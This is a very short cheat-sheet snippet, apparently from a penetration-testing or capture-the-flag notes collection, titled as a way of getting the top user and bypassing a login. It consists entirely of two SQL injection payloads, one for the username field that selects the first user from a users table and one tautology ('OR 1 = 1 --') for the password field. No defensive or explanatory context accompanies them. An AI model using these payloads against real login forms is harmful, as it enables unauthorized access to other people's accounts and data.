Getting top user and bypassing login (easy)
```Bash
# User field
' OR username = (SELECT TOP 1 username FROM users) --
# Pass field
' OR 1 = 1 --
```
